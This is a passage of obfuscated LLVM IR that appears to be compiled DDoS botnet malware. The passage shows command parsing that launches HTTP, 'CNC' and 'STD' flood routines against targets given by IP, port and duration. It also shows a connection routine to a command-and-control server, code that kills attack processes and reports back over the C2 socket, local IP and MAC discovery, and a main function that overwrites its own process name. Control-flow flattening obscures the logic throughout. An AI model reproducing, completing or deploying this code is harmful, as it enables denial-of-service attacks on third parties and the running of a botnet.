  store i8* %582, i8** %30, align 8
  %583 = load i8**, i8*** %4, align 8
  %584 = getelementptr inbounds i8*, i8** %583, i64 2
  %585 = load i8*, i8** %584, align 8
  %586 = call i32 @atoi(i8* %585) #10
  store i32 %586, i32* %31, align 4
  %587 = load i8**, i8*** %4, align 8
  %588 = getelementptr inbounds i8*, i8** %587, i64 3
  %589 = load i8*, i8** %588, align 8
  %590 = call i32 @atoi(i8* %589) #10
  store i32 %590, i32* %32, align 4
  %591 = load i8*, i8** %30, align 8
  %592 = call i8* @strstr(i8* %591, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %593 = icmp ne i8* %592, null
  %594 = select i1 %593, i32 644302380, i32 1126885746
  store i32 %594, i32* %switchVar
  br label %loopEnd

; <label>:595:                                    ; preds = %loopEntry
  %596 = load i8*, i8** %30, align 8
  %597 = call i8* @strtok(i8* %596, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %597, i8** %33, align 8
  store i32 -1566457759, i32* %switchVar
  br label %loopEnd

; <label>:598:                                    ; preds = %loopEntry
  %599 = load i8*, i8** %33, align 8
  %600 = icmp ne i8* %599, null
  %601 = select i1 %600, i32 6215105, i32 -1337235576
  store i32 %601, i32* %switchVar
  br label %loopEnd

; <label>:602:                                    ; preds = %loopEntry
  %603 = load i8*, i8** %33, align 8
  %604 = load i32, i32* %31, align 4
  %605 = load i32, i32* %32, align 4
  call void @sendHTTP(i8* %603, i32 %604, i32 %605)
  %606 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %606, i8** %33, align 8
  store i32 -1566457759, i32* %switchVar
  br label %loopEnd

; <label>:607:                                    ; preds = %loopEntry
  store i32 1898883463, i32* %switchVar
  br label %loopEnd

; <label>:608:                                    ; preds = %loopEntry
  %609 = load i8*, i8** %30, align 8
  %610 = load i32, i32* %31, align 4
  %611 = load i32, i32* %32, align 4
  call void @sendHTTP(i8* %609, i32 %610, i32 %611)
  store i32 1898883463, i32* %switchVar
  br label %loopEnd

; <label>:612:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:613:                                    ; preds = %loopEntry
  %614 = load i8**, i8*** %4, align 8
  %615 = getelementptr inbounds i8*, i8** %614, i64 0
  %616 = load i8*, i8** %615, align 8
  %617 = call i32 @strcmp(i8* %616, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.123, i32 0, i32 0)) #10
  %618 = icmp ne i32 %617, 0
  %619 = select i1 %618, i32 -21269822, i32 -174783096
  store i32 %619, i32* %switchVar
  br label %loopEnd

; <label>:620:                                    ; preds = %loopEntry
  %621 = load i32, i32* %3, align 4
  %622 = icmp slt i32 %621, 4
  %623 = select i1 %622, i32 -1647946313, i32 543731470
  store i32 %623, i32* %switchVar
  br label %loopEnd

; <label>:624:                                    ; preds = %loopEntry
  %625 = load i8**, i8*** %4, align 8
  %626 = getelementptr inbounds i8*, i8** %625, i64 2
  %627 = load i8*, i8** %626, align 8
  %628 = call i32 @atoi(i8* %627) #10
  %629 = icmp slt i32 %628, 1
  %630 = select i1 %629, i32 -1647946313, i32 -534250683
  store i32 %630, i32* %switchVar
  br label %loopEnd

; <label>:631:                                    ; preds = %loopEntry
  %632 = load i8**, i8*** %4, align 8
  %633 = getelementptr inbounds i8*, i8** %632, i64 3
  %634 = load i8*, i8** %633, align 8
  %635 = call i32 @atoi(i8* %634) #10
  %636 = icmp slt i32 %635, 1
  %637 = select i1 %636, i32 -1647946313, i32 1892124076
  store i32 %637, i32* %switchVar
  br label %loopEnd

; <label>:638:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:639:                                    ; preds = %loopEntry
  %640 = load i8**, i8*** %4, align 8
  %641 = getelementptr inbounds i8*, i8** %640, i64 1
  %642 = load i8*, i8** %641, align 8
  store i8* %642, i8** %34, align 8
  %643 = load i8**, i8*** %4, align 8
  %644 = getelementptr inbounds i8*, i8** %643, i64 2
  %645 = load i8*, i8** %644, align 8
  %646 = call i32 @atoi(i8* %645) #10
  store i32 %646, i32* %35, align 4
  %647 = load i8**, i8*** %4, align 8
  %648 = getelementptr inbounds i8*, i8** %647, i64 3
  %649 = load i8*, i8** %648, align 8
  %650 = call i32 @atoi(i8* %649) #10
  store i32 %650, i32* %36, align 4
  %651 = load i8*, i8** %34, align 8
  %652 = call i8* @strstr(i8* %651, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %653 = icmp ne i8* %652, null
  %654 = select i1 %653, i32 -1960829724, i32 -556808015
  store i32 %654, i32* %switchVar
  br label %loopEnd

; <label>:655:                                    ; preds = %loopEntry
  %656 = load i8*, i8** %34, align 8
  %657 = call i8* @strtok(i8* %656, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %657, i8** %37, align 8
  store i32 2082289827, i32* %switchVar
  br label %loopEnd

; <label>:658:                                    ; preds = %loopEntry
  %659 = load i8*, i8** %37, align 8
  %660 = icmp ne i8* %659, null
  %661 = select i1 %660, i32 1987812169, i32 -1624482372
  store i32 %661, i32* %switchVar
  br label %loopEnd

; <label>:662:                                    ; preds = %loopEntry
  %663 = call i32 @listFork()
  %664 = icmp ne i32 %663, 0
  %665 = select i1 %664, i32 -1931888448, i32 -634059635
  store i32 %665, i32* %switchVar
  br label %loopEnd

; <label>:666:                                    ; preds = %loopEntry
  %667 = load i8*, i8** %37, align 8
  %668 = load i32, i32* %35, align 4
  %669 = load i32, i32* %36, align 4
  call void @sendCNC(i8* %667, i32 %668, i32 %669)
  %670 = load i32, i32* @mainCommSock, align 4
  %671 = call i32 @close(i32 %670)
  call void @_exit(i32 0) #12
  unreachable

; <label>:672:                                    ; preds = %loopEntry
  %673 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %673, i8** %37, align 8
  store i32 2082289827, i32* %switchVar
  br label %loopEnd

; <label>:674:                                    ; preds = %loopEntry
  store i32 -1134280244, i32* %switchVar
  br label %loopEnd

; <label>:675:                                    ; preds = %loopEntry
  %676 = call i32 @listFork()
  %677 = icmp ne i32 %676, 0
  %678 = select i1 %677, i32 -2029736465, i32 -921439589
  store i32 %678, i32* %switchVar
  br label %loopEnd

; <label>:679:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:680:                                    ; preds = %loopEntry
  %681 = load i8*, i8** %34, align 8
  %682 = load i32, i32* %35, align 4
  %683 = load i32, i32* %36, align 4
  call void @sendCNC(i8* %681, i32 %682, i32 %683)
  call void @_exit(i32 0) #12
  unreachable

; <label>:684:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:685:                                    ; preds = %loopEntry
  %686 = load i8**, i8*** %4, align 8
  %687 = getelementptr inbounds i8*, i8** %686, i64 0
  %688 = load i8*, i8** %687, align 8
  %689 = call i32 @strcmp(i8* %688, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.124, i32 0, i32 0)) #10
  %690 = icmp ne i32 %689, 0
  %691 = select i1 %690, i32 715514632, i32 119654963
  store i32 %691, i32* %switchVar
  br label %loopEnd

; <label>:692:                                    ; preds = %loopEntry
  %693 = load i32, i32* %3, align 4
  %694 = icmp slt i32 %693, 4
  %695 = select i1 %694, i32 -781789792, i32 564445092
  store i32 %695, i32* %switchVar
  br label %loopEnd

; <label>:696:                                    ; preds = %loopEntry
  %697 = load i8**, i8*** %4, align 8
  %698 = getelementptr inbounds i8*, i8** %697, i64 2
  %699 = load i8*, i8** %698, align 8
  %700 = call i32 @atoi(i8* %699) #10
  %701 = icmp slt i32 %700, 1
  %702 = select i1 %701, i32 -781789792, i32 1137182680
  store i32 %702, i32* %switchVar
  br label %loopEnd

; <label>:703:                                    ; preds = %loopEntry
  %704 = load i8**, i8*** %4, align 8
  %705 = getelementptr inbounds i8*, i8** %704, i64 3
  %706 = load i8*, i8** %705, align 8
  %707 = call i32 @atoi(i8* %706) #10
  %708 = icmp slt i32 %707, 1
  %709 = select i1 %708, i32 -781789792, i32 1166645923
  store i32 %709, i32* %switchVar
  br label %loopEnd

; <label>:710:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:711:                                    ; preds = %loopEntry
  %712 = load i8**, i8*** %4, align 8
  %713 = getelementptr inbounds i8*, i8** %712, i64 1
  %714 = load i8*, i8** %713, align 8
  store i8* %714, i8** %38, align 8
  %715 = load i8**, i8*** %4, align 8
  %716 = getelementptr inbounds i8*, i8** %715, i64 2
  %717 = load i8*, i8** %716, align 8
  %718 = call i32 @atoi(i8* %717) #10
  store i32 %718, i32* %39, align 4
  %719 = load i8**, i8*** %4, align 8
  %720 = getelementptr inbounds i8*, i8** %719, i64 3
  %721 = load i8*, i8** %720, align 8
  %722 = call i32 @atoi(i8* %721) #10
  store i32 %722, i32* %40, align 4
  %723 = load i8*, i8** %38, align 8
  %724 = call i8* @strstr(i8* %723, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %725 = icmp ne i8* %724, null
  %726 = select i1 %725, i32 977772929, i32 1988226918
  store i32 %726, i32* %switchVar
  br label %loopEnd

; <label>:727:                                    ; preds = %loopEntry
  %728 = load i8*, i8** %38, align 8
  %729 = call i8* @strtok(i8* %728, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %729, i8** %41, align 8
  store i32 604535064, i32* %switchVar
  br label %loopEnd

; <label>:730:                                    ; preds = %loopEntry
  %731 = load i8*, i8** %41, align 8
  %732 = icmp ne i8* %731, null
  %733 = select i1 %732, i32 -1113970733, i32 1407654431
  store i32 %733, i32* %switchVar
  br label %loopEnd

; <label>:734:                                    ; preds = %loopEntry
  %735 = load i8*, i8** %41, align 8
  %736 = load i32, i32* %39, align 4
  %737 = load i32, i32* %40, align 4
  call void @sendSTD(i8* %735, i32 %736, i32 %737)
  %738 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %738, i8** %41, align 8
  store i32 604535064, i32* %switchVar
  br label %loopEnd

; <label>:739:                                    ; preds = %loopEntry
  store i32 697373760, i32* %switchVar
  br label %loopEnd

; <label>:740:                                    ; preds = %loopEntry
  %741 = load i8*, i8** %38, align 8
  %742 = load i32, i32* %39, align 4
  %743 = load i32, i32* %40, align 4
  call void @sendSTD(i8* %741, i32 %742, i32 %743)
  store i32 697373760, i32* %switchVar
  br label %loopEnd

; <label>:744:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:745:                                    ; preds = %loopEntry
  %746 = load i8**, i8*** %4, align 8
  %747 = getelementptr inbounds i8*, i8** %746, i64 0
  %748 = load i8*, i8** %747, align 8
  %749 = call i32 @strcmp(i8* %748, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.125, i32 0, i32 0)) #10
  %750 = icmp ne i32 %749, 0
  %751 = select i1 %750, i32 682049662, i32 -726871809
  store i32 %751, i32* %switchVar
  br label %loopEnd

; <label>:752:                                    ; preds = %loopEntry
  store i32 0, i32* %42, align 4
  store i64 0, i64* %43, align 8
  store i32 358632609, i32* %switchVar
  br label %loopEnd

; <label>:753:                                    ; preds = %loopEntry
  %754 = load i64, i64* %43, align 8
  %755 = load i64, i64* @numpids, align 8
  %756 = icmp ult i64 %754, %755
  %757 = select i1 %756, i32 1865306384, i32 -595948616
  store i32 %757, i32* %switchVar
  br label %loopEnd

; <label>:758:                                    ; preds = %loopEntry
  %759 = load i32*, i32** @pids, align 8
  %760 = load i64, i64* %43, align 8
  %761 = getelementptr inbounds i32, i32* %759, i64 %760
  %762 = load i32, i32* %761, align 4
  %763 = icmp ne i32 %762, 0
  %764 = select i1 %763, i32 1692374672, i32 745544530
  store i32 %764, i32* %switchVar
  br label %loopEnd

; <label>:765:                                    ; preds = %loopEntry
  %766 = load i32*, i32** @pids, align 8
  %767 = load i64, i64* %43, align 8
  %768 = getelementptr inbounds i32, i32* %766, i64 %767
  %769 = load i32, i32* %768, align 4
  %770 = call i32 @getpid() #2
  %771 = icmp ne i32 %769, %770
  %772 = select i1 %771, i32 -615542287, i32 745544530
  store i32 %772, i32* %switchVar
  br label %loopEnd

; <label>:773:                                    ; preds = %loopEntry
  %774 = load i32*, i32** @pids, align 8
  %775 = load i64, i64* %43, align 8
  %776 = getelementptr inbounds i32, i32* %774, i64 %775
  %777 = load i32, i32* %776, align 4
  %778 = call i32 @kill(i32 %777, i32 9) #2
  %779 = load i32, i32* %42, align 4
  %780 = add nsw i32 %779, 1
  store i32 %780, i32* %42, align 4
  store i32 745544530, i32* %switchVar
  br label %loopEnd

; <label>:781:                                    ; preds = %loopEntry
  store i32 1069656305, i32* %switchVar
  br label %loopEnd

; <label>:782:                                    ; preds = %loopEntry
  %783 = load i64, i64* %43, align 8
  %784 = add i64 %783, 1
  store i64 %784, i64* %43, align 8
  store i32 358632609, i32* %switchVar
  br label %loopEnd

; <label>:785:                                    ; preds = %loopEntry
  %786 = load i32, i32* %42, align 4
  %787 = icmp sgt i32 %786, 0
  %788 = select i1 %787, i32 706731464, i32 -6113421
  store i32 %788, i32* %switchVar
  br label %loopEnd

; <label>:789:                                    ; preds = %loopEntry
  %790 = load i32, i32* @mainCommSock, align 4
  %791 = load i32, i32* %42, align 4
  %792 = call i32 (i32, i8*, ...) @sockprintf(i32 %790, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i32 0, i32 0), i32 %791)
  store i32 -445286146, i32* %switchVar
  br label %loopEnd

; <label>:793:                                    ; preds = %loopEntry
  %794 = load i32, i32* @mainCommSock, align 4
  %795 = call i32 (i32, i8*, ...) @sockprintf(i32 %794, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.127, i32 0, i32 0))
  store i32 -445286146, i32* %switchVar
  br label %loopEnd

; <label>:796:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:797:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %796, %793, %789, %785, %782, %781, %773, %765, %758, %753, %752, %745, %744, %740, %739, %734, %730, %727, %711, %710, %703, %696, %692, %685, %684, %679, %675, %674, %672, %662, %658, %655, %639, %638, %631, %624, %620, %613, %612, %608, %607, %602, %598, %595, %579, %578, %571, %564, %560, %553, %552, %551, %539, %538, %536, %524, %520, %517, %512, %511, %506, %502, %501, %496, %474, %473, %466, %462, %455, %451, %444, %437, %430, %423, %419, %412, %411, %410, %397, %396, %394, %381, %377, %374, %369, %368, %363, %359, %358, %353, %349, %348, %343, %320, %319, %312, %308, %301, %294, %287, %280, %273, %266, %259, %255, %248, %247, %242, %238, %237, %235, %225, %221, %218, %202, %201, %194, %187, %183, %176, %175, %170, %166, %165, %163, %155, %151, %148, %132, %131, %124, %117, %113, %106, %101, %94, %93, %89, %82, %78, %71, %64, %53, %50, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

declare i32 @killer_kill(...) #3

declare i32 @killer_init(...) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 4096, i32 16, i1 false)
  %4 = load i32, i32* @mainCommSock, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1552329212, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1552329212, label %first
    i32 -1597535869, label %7
    i32 1825512593, label %10
    i32 -1938464592, label %21
    i32 754871693, label %22
    i32 281375824, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp ne i32 %.reload, 0
  %6 = select i1 %5, i32 -1597535869, i32 1825512593
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  store i32 1825512593, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %12 = load i8*, i8** @cncip, align 8
  %13 = call i8* @strcpy(i8* %11, i8* %12) #2
  %14 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %14, i32* @mainCommSock, align 4
  %15 = load i32, i32* @mainCommSock, align 4
  %16 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %17 = load i32, i32* @cncport, align 4
  %18 = call i32 @connectTimeout(i32 %15, i8* %16, i32 %17, i32 30)
  %19 = icmp ne i32 %18, 0
  %20 = select i1 %19, i32 754871693, i32 -1938464592
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 281375824, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 281375824, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %1, align 4
  ret i32 %24

loopEnd:                                          ; preds = %22, %21, %10, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1507744337, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1507744337, label %first
    i32 901702396, label %16
    i32 2077789411, label %17
    i32 -2048154221, label %31
    i32 -2042965043, label %32
    i32 -970376396, label %39
    i32 636951745, label %40
    i32 1781170328, label %45
    i32 601555418, label %51
    i32 -442326683, label %56
    i32 318843054, label %58
    i32 -1181886406, label %64
    i32 146951469, label %67
    i32 1273704699, label %69
    i32 -369001549, label %71
    i32 -2132487074, label %78
    i32 2012887972, label %86
    i32 -794193097, label %90
    i32 546326149, label %102
    i32 -855554042, label %105
    i32 1609310794, label %106
    i32 1440725612, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 901702396, i32 2077789411
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1440725612, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.128, i32 0, i32 0)) #2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = call zeroext i16 @htons(i16 zeroext 53) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 16)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, -1
  %30 = select i1 %29, i32 -2048154221, i32 -2042965043
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1440725612, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 16, i32* %6, align 4
  %33 = load i32, i32* %2, align 4
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = call i32 @getsockname(i32 %33, %struct.sockaddr* %34, i32* %6) #2
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  %38 = select i1 %37, i32 -970376396, i32 636951745
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1440725612, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.129, i32 0, i32 0), i32 0)
  store i32 %44, i32* %7, align 4
  store i32 1781170328, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %47 = load i32, i32* %7, align 4
  %48 = call i8* @fdgets(i8* %46, i32 4096, i32 %47)
  %49 = icmp ne i8* %48, null
  %50 = select i1 %49, i32 601555418, i32 -369001549
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %53 = call i8* @strstr(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.130, i32 0, i32 0)) #10
  %54 = icmp ne i8* %53, null
  %55 = select i1 %54, i32 -442326683, i32 1273704699
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %57, i8** %9, align 8
  store i32 318843054, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8*, i8** %9, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp ne i32 %61, 9
  %63 = select i1 %62, i32 -1181886406, i32 146951469
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %9, align 8
  store i32 318843054, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %9, align 8
  store i8 0, i8* %68, align 1
  store i32 -369001549, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 4096, i32 16, i1 false)
  store i32 1781170328, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @close(i32 %72)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %75 = load i8, i8* %74, align 16
  %76 = icmp ne i8 %75, 0
  %77 = select i1 %76, i32 -2132487074, i32 1609310794
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %80 = bitcast %union.anon.6* %79 to [16 x i8]*
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %80, i32 0, i32 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %83 = call i8* @strcpy(i8* %81, i8* %82) #2
  %84 = load i32, i32* %2, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  store i32 2012887972, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 6
  %89 = select i1 %88, i32 -794193097, i32 -855554042
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %92 = bitcast %union.anon.7* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  store i32 546326149, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  store i32 2012887972, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 1609310794, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  store i32 1440725612, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %1, align 4
  ret i32 %110

loopEnd:                                          ; preds = %106, %105, %102, %90, %86, %78, %71, %69, %67, %64, %58, %56, %51, %45, %40, %39, %32, %31, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [256 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca [256 x i8], align 16
  %15 = alloca [1024 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca [4096 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca [1024 x i8], align 16
  %29 = alloca i32, align 4
  %30 = alloca [10 x i8*], align 16
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i8** %6, align 8
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @strlen(i8* %39) #10
  %41 = call i8* @strncpy(i8* %36, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i64 %40) #2
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
